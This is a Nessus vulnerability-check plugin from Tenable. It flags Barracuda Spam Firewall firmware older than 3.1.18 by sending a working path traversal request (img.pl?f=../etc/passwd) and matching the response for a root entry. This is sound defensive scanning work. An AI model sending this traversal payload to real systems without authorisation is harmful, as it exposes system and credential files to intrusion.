#
# (C) Tenable Network Security
#


if (description) {
  script_id(19556);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2847", "CVE-2005-2848");
  script_bugtraq_id(14710, 14712);

  name["english"] = "Barracuda Spam Firewall Firmware < 3.1.18 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server is affected by multiple vulnerabilities. 

Description :

The remote host appears to be a Barracuda Spam Firewall network
appliance, which protects mail servers from spam, viruses, and the
like. 

Further, it appears that the installed appliance suffers from several
vulnerabilities that allow for execution of arbitrary code and reading
of arbitrary files, all subject to the permissions of the web server
user id. 

See also : 

http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1

Solution : 

Upgrade to firmware 3.1.18 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Barracuda Spam Firewall firmware < 3.1.18";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Try to exploit one of the flaws to read /etc/passwd.
req = http_get(
  item:string(
    "/cgi-bin/img.pl?",
    "f=../etc/passwd"
  ), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

# There's a problem if there's an entry for root.
if (egrep(string:res, pattern:"root:.*:0:[01]:"))
  security_hole(port);
